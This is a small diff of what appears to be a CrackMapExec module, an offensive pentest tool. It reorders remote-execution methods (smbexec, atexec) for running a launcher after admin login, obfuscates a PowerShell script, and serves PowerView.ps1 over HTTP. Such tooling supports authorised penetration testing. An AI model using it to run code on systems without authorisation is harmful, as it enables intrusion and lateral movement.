@@ -68,10 +68,10 @@ class CMEModule:
             return obfs_ps_script(ps_script.read())
 
     def on_admin_login(self, context, connection, launcher, payload):
-        connection.execute(launcher, methods=['atexec', 'smbexec'])
+        connection.execute(launcher, methods=['smbexec', 'atexec'])
         context.log.success('Executed launcher')
 
-    def on_request(self, context, request):
+    def on_request(self, context, request, launcher, payload):
         if 'PowerView.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
